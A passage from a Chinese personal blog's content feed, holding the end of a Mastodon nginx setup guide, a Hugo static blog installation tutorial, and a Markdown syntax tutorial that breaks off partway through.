fail_timeout=0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">upstream streaming &#123;</span><br><span class="line">    server 127.0.0.1:4000 fail_timeout=0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">proxy_cache_path /var/cache/nginx levels=1:2 keys_zone=CACHE:10m inactive=7d max_size=1g;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">  listen 80;</span><br><span class="line">  listen [::]:80;</span><br><span class="line">  server_name vue.gjcloak.xyz;</span><br><span class="line">  root /home/mastodon/mastodon/public;</span><br><span class="line">  location /.well-known/acme-challenge/ &#123; allow all; &#125;</span><br><span class="line">  location / &#123; return 301 https://$host$request_uri; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">  listen 443 ssl http2;</span><br><span class="line">  listen [::]:443 ssl http2;</span><br><span class="line">  server_name vue.gjcloak.xyz;</span><br><span class="line"></span><br><span class="line">  ssl_protocols TLSv1.2 TLSv1.3;</span><br><span class="line">  ssl_ciphers HIGH:!MEDIUM:!LOW:!aNULL:!NULL:!SHA;</span><br><span class="line">  ssl_prefer_server_ciphers on;</span><br><span class="line">  ssl_session_cache shared:SSL:10m;</span><br><span class="line">  ssl_session_tickets off;</span><br><span class="line"></span><br><span class="line">  # Uncomment these lines once you acquire a certificate:</span><br><span class="line">  ssl_certificate     /www/server/panel/vhost/cert/vue.gjcloak.xyz/fullchain.pem;</span><br><span class="line">  ssl_certificate_key /www/server/panel/vhost/cert/vue.gjcloak.xyz/privkey.pem;</span><br><span class="line"></span><br><span class="line">  keepalive_timeout    70;</span><br><span class="line">  sendfile             on;</span><br><span class="line">  client_max_body_size 80m;</span><br><span class="line"></span><br><span class="line">  root /home/mastodon/mastodon/public;</span><br><span class="line"></span><br><span class="line">  gzip on;</span><br><span class="line">  gzip_disable &quot;msie6&quot;;</span><br><span class="line">  gzip_vary on;</span><br><span class="line">  gzip_proxied any;</span><br><span class="line">  gzip_comp_level 6;</span><br><span class="line">  gzip_buffers 16 8k;</span><br><span class="line">  gzip_http_version 1.1;</span><br><span class="line">  gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript image/svg+xml image/x-icon;</span><br><span class="line"></span><br><span class="line">  add_header Strict-Transport-Security &quot;max-age=31536000&quot; always;</span><br><span class="line"></span><br><span class="line">  location / &#123;</span><br><span class="line">    try_files $uri @proxy;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  location ~ ^/(emojipackssystem/accounts/avatarssystem/media_attachments/files) &#123;</span><br><span class="line">    add_header Cache-Control &quot;public, max-age=31536000, immutable&quot;;</span><br><span class="line">    add_header Strict-Transport-Security &quot;max-age=31536000&quot; always;</span><br><span class="line">    try_files $uri @proxy;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  location /sw.js &#123;</span><br><span class="line">    add_header Cache-Control &quot;public, max-age=0&quot;;</span><br><span class="line">    add_header Strict-Transport-Security &quot;max-age=31536000&quot; always;</span><br><span class="line">    try_files $uri @proxy;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  location @proxy &#123;</span><br><span class="line">    proxy_set_header Host $host;</span><br><span class="line">    proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">    proxy_set_header X-Forwarded-Proto $scheme;</span><br><span class="line">    proxy_set_header Proxy &quot;&quot;;</span><br><span class="line">    proxy_pass_header Server;</span><br><span class="line"></span><br><span class="line">    proxy_pass http://backend;</span><br><span class="line">    proxy_buffering on;</span><br><span class="line">    proxy_redirect off;</span><br><span class="line">    proxy_http_version 1.1;</span><br><span class="line">    proxy_set_header Upgrade $http_upgrade;</span><br><span class="line">    proxy_set_header Connection $connection_upgrade;</span><br><span class="line"></span><br><span class="line">    proxy_cache CACHE;</span><br><span class="line">    proxy_cache_valid 200 7d;</span><br><span class="line">    proxy_cache_valid 410 24h;</span><br><span class="line">    proxy_cache_use_stale error timeout updating http_500 http_502 http_503 http_504;</span><br><span class="line">    add_header X-Cached $upstream_cache_status;</span><br><span class="line">    add_header Strict-Transport-Security &quot;max-age=31536000&quot; always;</span><br><span class="line"></span><br><span class="line">    tcp_nodelay on;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  location /api/v1/streaming &#123;</span><br><span class="line">    proxy_set_header Host $host;</span><br><span class="line">    proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">    proxy_set_header X-Forwarded-Proto $scheme;</span><br><span class="line">    proxy_set_header Proxy &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    proxy_pass http://streaming;</span><br><span class="line">    proxy_buffering off;</span><br><span class="line">    proxy_redirect off;</span><br><span class="line">    proxy_http_version 1.1;</span><br><span class="line">    proxy_set_header Upgrade $http_upgrade;</span><br><span class="line">    proxy_set_header Connection $connection_upgrade;</span><br><span class="line"></span><br><span class="line">    tcp_nodelay on;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  error_page 500 501 502 503 504 /500.html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中19行改成自己的域名，20行和44行改成源码地址&#x2F;home&#x2F;mastodon&#x2F;mastodon&#x2F;public，去掉ssl证书部分内容的注释 #，路径填上证书或密钥所在的绝对路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssl_certificate     /www/server/panel/vhost/cert/vue.gjcloak.xyz/fullchain.pem;</span><br><span class="line">ssl_certificate_key /www/server/panel/vhost/cert/vue.gjcloak.xyz/privkey.pem;</span><br></pre></td></tr></table></figure><p>至此，较为基本的安装步骤大致就完成了</p><p>完事……</p><h1 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h1><p><a href="https://docs.joinmastodon.org/">官方文档</a></p><p><a href="https://zhuanlan.zhihu.com/p/492442130">Mastodon 长毛象实例最简搭建法论</a></p><p><a href="https://candinya.com/posts/mastodon-first-meet/">Mastodon搭建小记</a></p><p><a href="https://github.com/pullopen/pullopen.github.io/issues/3">如何利用Docker搭建Mastodon实例（一）：基础搭建篇 - 技术小白搭建Mastodon站点指南</a></p><p><a href="https://www.rin404.com/archives/mastodon.html">Mastodon丨CentOs7下搭建长毛象实例</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
            <tag> 笔记 </tag>
            
            <tag> 去中心化 </tag>
            
            <tag> mastodon </tag>
            
            <tag> 教程 </tag>
            
            <tag> 推特 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hugo搭建博客笔记</title>
      <link href="/84.html"/>
      <url>/84.html</url>
      
        <content type="html"><![CDATA[<h1 id="使用环境"><a href="#使用环境" class="headerlink" title="使用环境"></a>使用环境</h1><ul><li>系统：Debian GNU&#x2F;Linux 11 x86_64</li><li>宝塔：7.9.0</li><li>GIt</li></ul><h1 id="安装hugo"><a href="#安装hugo" class="headerlink" title="安装hugo"></a>安装hugo</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install hugo</span><br></pre></td></tr></table></figure><p>检查是否安装成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hugo version</span><br></pre></td></tr></table></figure><p>输出下图内容，即安装成功</p><p><img src="https://cos.gjcloak.xyz/file/image-1653005647285.png"></p><h1 id="创建站点"><a href="#创建站点" class="headerlink" title="创建站点"></a>创建站点</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hugo new site Hugo_blog</span><br></pre></td></tr></table></figure><p><code>Hugo_blog</code>可以自定义，就是生成的hugo文件夹名字，自此Hugo站点生成完毕。</p><p><img src="https://cos.gjcloak.xyz/file/image-1653005972193.png" alt="image-1653005972193" title="image-1653005972193"></p><h1 id="主题安装"><a href="#主题安装" class="headerlink" title="主题安装"></a>主题安装</h1><p>可以参阅官网的 <a href="https://themes.gohugo.io/">themes.gohugo.io</a> 查看可用的主题列表。</p><p>先进入<code>Hugo_blog</code>文件夹，我是放在了<code>/www/wwwroot/Hugo_blog</code>这个路径下</p><p><img src="https://cos.gjcloak.xyz/file/image-1653006149634.png"></p><p>在生成的<code>Hugo_blog</code>目录下点击终端，</p><p><img src="https://cos.gjcloak.xyz/file/image-1653006199902.png"></p><p>宝塔会自动用cd指令进入该目录下,先执行初始化指令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/file/image-1653006357747.png" alt="image-1653006357747" title="image-1653006357747"></p><p>然后执行获取主题的命令，没有用过Git的可以先去简单安装一下，很简单。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git submodule add https://github.com/budparr/gohugo-theme-ananke.git themes/ananke</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/file/image-1653006453465.png" alt="image-1653006453465" title="image-1653006453465"></p><p>显示done，便是安装好了，最后，先打开<code>config.toml</code></p><p><img src="https://cos.gjcloak.xyz/file/image-1653006538925.png" alt="image-1653006538925" title="image-1653006538925"></p><p>将主题添加到站点的配置文件中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">theme = &quot;ananke&quot;</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/file/image-1653006885954.png" alt="image-1653006885954" title="image-1653006885954"></p><p><img src="https://cos.gjcloak.xyz/file/image-1653006938730.png" alt="image-1653006938730" title="image-1653006938730"></p><p>当然也可以用一条指令完成添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;theme = &quot;ananke&quot;&#x27; &gt;&gt; config.toml</span><br></pre></td></tr></table></figure><h1 id="添加内容"><a href="#添加内容" class="headerlink" title="添加内容"></a>添加内容</h1><p>这个时候其实博客已经搭建好了，但为了更好看看效果还是要添加下文章看看效果如何。</p><p><img src="https://cos.gjcloak.xyz/file/image-1653006199902.png" alt="image-1653006199902" title="image-1653006199902"></p><p>在<code>Hugo_blog</code>目录下，终端里，输入一下命令（当然你也可以不用宝塔，直接在终端通过cd指令也行，直接手动创建也是可以的）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hugo new post/some-content.md</span><br></pre></td></tr></table></figure><p>站点目录下此时会出现一个content文件夹，文章是存放在了post目录下，新创建的文件默认包含如下内容，根据需要修改即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: &quot;Some Content&quot;</span><br><span class="line">date: 2022-05-20T08:40:33+08:00</span><br><span class="line">draft: true</span><br><span class="line">---</span><br></pre></td></tr></table></figure><h1 id="预览博客"><a href="#预览博客" class="headerlink" title="预览博客"></a>预览博客</h1><blockquote><p>因为我是直接在服务器进行的搭建的，所以我就不用<code>hugo server -D</code>指令进行预览了，我是直接把生成的静态文件放入新增的站点下来直接访问域名查看。</p></blockquote><p>首先，构建静态文件。默认情况下，输出的内容位于 站点目录&#x2F;public&#x2F; 目录中（可以通过<code>-d/--destination</code>参数修改输出位置，或者在配置文件中设置<code>publishdir</code>参数）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hugo -D</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/file/image-1653007952274.png" alt="image-1653007952274" title="image-1653007952274"></p><p>然后，我是有个测试站点的</p><p><img src="https://cos.gjcloak.xyz/file/image-1653008053726.png" alt="image-1653008053726" title="image-1653008053726"></p><p>我把hugo生成的静态挪到测试站点，复制过去后访问域名马上就能看到情况，显示下图情况，便完成了hugo博客搭建</p><p><img src="https://cos.gjcloak.xyz/file/image-1653008453063.png" alt="image-1653008453063" title="image-1653008453063"></p><h1 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h1><p>1、主题的文件路径是这样的Hugo_blog\themes\ananke，路径不要弄错了。</p><p>2、在Hugo_Blog目录下创建一个content文件夹，content文件夹下再创建一个post文件夹。post文件夹里才是真正放md文档的地方。如果路径放错了，文章显示不出来。</p><p>3、语言设置<br>这两行配置改一下就行了。注意就是小写，不是大写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">languageCode = &quot;zh-cn&quot;</span><br><span class="line">defaultContentLanguage = &quot;zh-cn&quot;  </span><br></pre></td></tr></table></figure><p>4、关于作者【菜单】<br>在这个目录下Hugo_blog\content直接创建md文档编写即可，文档里的title就是菜单名</p><p>5、报错<code>error: failed to transform resource: SCSS</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Building sites … ERROR 2019/08/27 16:56:32 error: failed to transform resource: SCSS processing failed: file &quot;stdin&quot;, line 3, col 1: File to import not found or unreadable: bulma/bulma. </span><br><span class="line">Total in 13 ms</span><br><span class="line">Error: Error building site: logged 1 error(s)</span><br></pre></td></tr></table></figure><p>这个错误耗费的时间比较长，最后找到了hugo一个英文社区。大神说把hugo换成扩展版就可以了，然后就成功了。<br>地址:<a href="https://github.com/gohugoio/hugo/releases">hugo</a></p><p>6、页面加载不出来</p><ul><li>hexo是在站点目录，比如Hexo_blog下进行git commit等类似操作的。</li><li>hugo是首先在Hugo_blog进行hugo编译，然后生成一个public文件夹。然后在Hugo_blog\public 目录下进行 git commit的，很容易出错。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> 搭建 </tag>
            
            <tag> 静态博客 </tag>
            
            <tag> hugo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown 语法</title>
      <link href="/83.html"/>
      <url>/83.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-标题"><a href="#1-标题" class="headerlink" title="1 标题"></a>1 标题</h2><p>Markdown支持6种级别的标题，对应html标签 h1 ~ h6</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># h1   //一级标题 对应 &lt;h1&gt; &lt;/h1&gt;</span><br><span class="line">## h2   //二级标题 对应 &lt;h2&gt; &lt;/h2&gt;</span><br><span class="line">### h3  //三级标题 对应 &lt;h3&gt; &lt;/h3&gt;</span><br><span class="line">#### h4  //四级标题 对应 &lt;h4&gt; &lt;/h4&gt;</span><br><span class="line">##### h5  //五级标题 对应 &lt;h5&gt; &lt;/h5&gt;</span><br><span class="line">###### h6  //六级标题 对应 &lt;h6&gt; &lt;/h6&gt;</span><br></pre></td></tr></table></figure><h2 id="2-段落及区块引用"><a href="#2-段落及区块引用" class="headerlink" title="2 段落及区块引用"></a>2 段落及区块引用</h2><p>Markdown提供了一个特殊符号 &gt; 用于段首进行强调，被强调的文字部分将会高亮显示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; 这段文字将会被高亮显示...</span><br></pre></td></tr></table></figure><p>以上标记显示效果如下：</p><blockquote><p>这段文字将会被高亮显示…</p></blockquote><h2 id="3-插入链接或图片"><a href="#3-插入链接或图片" class="headerlink" title="3 插入链接或图片"></a>3 插入链接或图片</h2><p>Markdown针对链接和图片的处理也比较简单，可以使用下面的语法进行标记</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[点击跳转至百度](https://www.baidu.com)</span><br><span class="line">![图片](https://raw.githubusercontent.com/wugenqiang/picGo/master/pictures/015.jpg)</span><br></pre></td></tr></table></figure><blockquote><p>注： 引用图片和链接的唯一区别就是在最前方添加一个感叹号。</p></blockquote><h2 id="4-列表"><a href="#4-列表" class="headerlink" title="4 列表"></a>4 列表</h2><p>Markdown支持有序列表和无序列表两种形式：</p><ul><li>无序列表使用 * 或 + 或 - 标识</li><li>有序列表使用数字加 . 标识，例如：1.</li></ul><h2 id="5-分隔线"><a href="#5-分隔线" class="headerlink" title="5 分隔线"></a>5 分隔线</h2><p>有时候，为了排版漂亮，可能会加入分隔线。Markdown加入分隔线非常简单，使用下面任意一种形式都可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">***</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>以上标记显示效果如下：</p><hr><hr><h2 id="6-内容强调"><a href="#6-内容强调" class="headerlink" title="6 内容强调"></a>6 内容强调</h2><h3 id="6-1-斜体和加粗"><a href="#6-1-斜体和加粗" class="headerlink" title="6.1 斜体和加粗"></a>6.1 斜体和加粗</h3><p>有时候，我们对某一部分文字进行强调，使用 * 或 _ 包裹即可。使用单一符号标记的效果是斜体，使用两个符号标记的效果是加粗</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">*这里是斜体*</span><br><span class="line">_这里是斜体_</span><br><span class="line"></span><br><span class="line">**这里是加粗**</span><br><span class="line">__这里是加粗__</span><br><span class="line"></span><br><span class="line">***这里是加粗并斜体***</span><br><span class="line">___这里是加粗并斜体___</span><br></pre></td></tr></table></figure><p>以上标记显示效果如下：</p><p><em>这里是斜体</em><br><em>这里是斜体</em></p><p><strong>这里是加粗</strong><br><strong>这里是加粗</strong></p><p><strong><em>这里是加粗并斜体</em></strong><br><strong><em>这里是加粗并斜体</em></strong></p><h3 id="6-2-加下划线"><a href="#6-2-加下划线" class="headerlink" title="6.2 加下划线"></a>6.2 加下划线</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;u&gt;下划线&lt;/u&gt;</span><br></pre></td></tr></table></figure><p>效果如下：</p><p>下划线</p><p>也可以使用 <code>&lt;span&gt;&lt;/span&gt;</code> 标签完成加下划线的操作，推荐这种方式：</p><p>举例说明：下划线为绿色，并且高度为 1px，并且下划线为虚线。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;span style=&quot;border-bottom:1px dashed green;&quot;&gt;所添加的需要加下划线的行内文字&lt;/span&gt;</span><br></pre></td></tr></table></figure><p>效果如下：</p><p>所添加的需要加下划线的行内文字</p><p><strong>注意，要实现下划线为实线的话，请把<code>dashed</code>修改为<code>solid</code></strong></p><p>效果如下：</p><p>所添加的需要加下划线的行内文字</p><h2 id="7-删除线"><a href="#7-删除线" class="headerlink" title="7 删除线"></a>7 删除线</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这样来 ~~删除一段文本~~</span><br></pre></td></tr></table></figure><p>以上标记显示效果如下：</p><p>这样来 删除一段文本</p><h2 id="8-高亮显示"><a href="#8-高亮显示" class="headerlink" title="8 高亮显示"></a>8 高亮显示</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用&lt;code&gt;\`&lt;/code&gt;来强调字符//想打出 ` (反引号)需要转义，加&lt;code&gt;&lt;/code&gt;标签强调</span><br><span class="line">比如`突出背景色`来显示强调效果</span><br></pre></td></tr></table></figure><p>以上标记显示效果如下：</p><p>使用<code>\` </code>来强调字符<br>比如 <code>突出背景色</code> 来显示强调效果</p><h2 id="9-嵌套引用"><a href="#9-嵌套引用" class="headerlink" title="9 嵌套引用"></a>9 嵌套引用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt; 动物</span><br><span class="line">&gt;&gt; 水生动物</span><br><span class="line">&gt;&gt; 陆生动物</span><br><span class="line">&gt;&gt;&gt; 猴子</span><br><span class="line">&gt;&gt;&gt; 人</span><br><span class="line">&gt;&gt;&gt;&gt; 程序猿</span><br><span class="line">&gt;&gt;&gt;&gt; 攻城狮</span><br><span class="line">&gt;&gt;产品狗 //这里需要注意，没有空行间隔，忽略降级引用标记</span><br><span class="line">射鸡虱   //这里需要注意，没有空行间隔，忽略降级引用标记</span><br><span class="line"></span><br><span class="line">&gt;&gt; 两栖类动物</span><br><span class="line">&gt;&gt;&gt; 大鳄鱼</span><br><span class="line">唐老鸭</span><br><span class="line"></span><br><span class="line">两个回车结束引用,不在引用范围内了！</span><br></pre></td></tr></table></figure><p>以上标记显示效果如下：</p><blockquote><p>动物</p><blockquote><p>水生动物<br>陆生动物</p><blockquote><p>猴子<br>人</p><blockquote><p>程序猿<br>攻城狮<br>产品狗 &#x2F;&#x2F;这里需要注意，没有空行间隔，忽略降级引用标记<br>射鸡虱 &#x2F;&#x2F;这里需要注意，没有空行间隔，忽略降级引用标记</p></blockquote></blockquote><p>两栖类动物</p><blockquote><p>大鳄鱼<br>唐老鸭</p></blockquote></blockquote></blockquote><p>两个回车结束引用,不在引用范围内了！</p><h2 id="10-修改图片"><a href="#10-修改图片" class="headerlink" title="10 修改图片"></a>10 修改图片</h2><h3 id="10-1-设置图片尺寸"><a href="#10-1-设置图片尺寸" class="headerlink" title="10.1 设置图片尺寸"></a>10.1 设置图片尺寸</h3><p>在 markdown 直接使用提供的语法引入图片是无法设置大小的，所以我们需要用到 html 的 img 标签。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img width=&quot;  &quot; alt=&quot;描述&quot; src=&quot;url&quot;/&gt;</span><br></pre></td></tr></table></figure><h3 id="10-2-设置图片居中"><a href="#10-2-设置图片居中" class="headerlink" title="10.2 设置图片居中"></a>10.2 设置图片居中</h3><p>在 markdown 设置图片居中是需要通过 div 来控制的。</p><h3 id="10-3-Docsify-调整图片大小"><a href="#10-3-Docsify-调整图片大小" class="headerlink" title="10.3 Docsify 调整图片大小"></a>10.3 Docsify 调整图片大小</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">![logo](https://docsify.js.org/_media/icon.svg &#x27;:size=WIDTHxHEIGHT&#x27;)</span><br><span class="line">![logo](https://docsify.js.org/_media/icon.svg &#x27;:size=50x100&#x27;)</span><br><span class="line">![logo](https://docsify.js.org/_media/icon.svg &#x27;:size=100&#x27;)</span><br><span class="line"></span><br><span class="line">&lt;!-- Support percentage --&gt;</span><br><span class="line"></span><br><span class="line">![logo](https://docsify.js.org/_media/icon.svg &#x27;:size=10%&#x27;)</span><br></pre></td></tr></table></figure><p><img src="https://docsify.js.org/_media/icon.svg" alt=" title=" title=" title="><br><img src="https://docsify.js.org/_media/icon.svg" alt=" title=" title=" title="><br><img src="https://docsify.js.org/_media/icon.svg" alt=" title=" title=" title="></p><p><img src="https://docsify.js.org/_media/icon.svg" alt=" title=" title=" title="></p><h2 id="11-插入代码块"><a href="#11-插入代码块" class="headerlink" title="11 插入代码块"></a>11 插入代码块</h2><p>Markdown在IT圈子里面比较流行的一个重要原因是，它能够轻松漂亮地插入代码。<br>方法是，使用三个反引号 \` 进行包裹即可。如果是行内代码引用，使用单个反引号进行包裹</p><p>代码块语法遵循标准 <code>markdown</code> 代码，使用 \`\`\` 开始 ，\`\`\` 结束 例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">​```Python</span><br><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">print &#x27;Hello World! </span><br><span class="line">```</span><br></pre></td></tr></table></figure><p>以上标记显示效果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">print &#x27;Hello World! </span><br></pre></td></tr></table></figure><blockquote><p>注：很多人不知道怎么输入反引号。在英文模式下，找到键盘最左侧esc键下面的第一个键点击即可。<br>有人会问：如何在代码块中打出 \`\`\`<br>实际上是使用 4个\` 包含 3个\` 就可以了，想表示更多，最外层+1就好了。</p></blockquote><p>\`\`\`\`<br>\`\`\`<br>\`\`\`<br>\`\`\`\`</p><h2 id="12-插入表格"><a href="#12-插入表格" class="headerlink" title="12 插入表格"></a>12 插入表格</h2><p>表格是Markdown语法中比较复杂的一个，其语法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">列1    列2  列3 </span><br><span class="line">-----  ---  ---- </span><br><span class="line">第1行  12   13  </span><br><span class="line">第2行  22   23  </span><br><span class="line">第3行  32   33  </span><br></pre></td></tr></table></figure><p>以上标记显示效果如下：</p><p>列1</p><p>列2</p><p>列3</p><p>第1行</p><p>12</p><p>13</p><p>第2行</p><p>22</p><p>23</p><p>第3行</p><p>32</p><p>33</p><p>可以使用<code>冒号</code>来定义对齐方式：</p><p>全居中样式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">表头条目一条目二</span><br><span class="line">:---::---::---:</span><br><span class="line">项目项目一项目二</span><br></pre></td></tr></table></figure><p>以上标记显示效果如下：</p><p>表头</p><p>条目一</p><p>条目二</p><p>项目</p><p>项目一</p><p>项目二</p><p>可能有人喜欢左对齐或者右对齐，也可以设置:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">左对齐      右对齐  居中 </span><br><span class="line">:--------  -------: :--: </span><br><span class="line">Computer   5000 元   1台 </span><br><span class="line">Phone      1999 元   1部 </span><br></pre></td></tr></table></figure><p>以上标记显示效果如下：</p><p>左对齐</p><p>右对齐</p><p>居中</p><p>Computer</p><p>5000 元</p><p>1台</p><p>Phone</p><p>1999 元</p><p>1部</p><p>注：三个短竖杠左右的冒号用于控制对齐方式，只放置左边冒号表示文字居左，只放置右边冒号表示文字居右，如果两边都放置冒号表示文字居中。</p><h2 id="13-特殊符号处理"><a href="#13-特殊符号处理" class="headerlink" title="13 特殊符号处理"></a>13 特殊符号处理</h2><p>Markdown使用反斜杠\插入语法中用到的特殊符号。在Markdown中，主要有以下几种特殊符号需要处理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">\   反斜线</span><br><span class="line">`   反引号</span><br><span class="line">*   星号</span><br><span class="line">_   底线</span><br><span class="line">&#123;&#125;  花括号</span><br><span class="line">[]  方括号</span><br><span class="line">()  括弧</span><br><span class="line">#   井字号</span><br><span class="line">+   加号</span><br><span class="line">-   减号</span><br><span class="line">.   英文句点</span><br><span class="line">!   惊叹号</span><br></pre></td></tr></table></figure><p>例如，如果你需要插入反斜杠，就连续输入两个反斜杠即可：\ \ &#x3D;&gt; \ 。</p><p>注：在内容中输入以上特殊符号的时候一定要注意转义，否则将导致内容显示不全，甚至排版混乱。</p><p>重要：MarkDown表格中使用竖线，如何做？</p><p>表格中使用竖线 竖线数目</p><p>一个竖线: &amp; # 1 2 4 ;</p><p>两个竖线: &amp; # 1 2 4 ; &amp; # 1 2 4 ;</p><h2 id="14-使用-Emoji-表情"><a href="#14-使用-Emoji-表情" class="headerlink" title="14 使用 Emoji 表情"></a>14 使用 Emoji 表情</h2><p>举例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello EnjoyToShare :smile:</span><br></pre></td></tr></table></figure><p>效果：</p><p>Hello 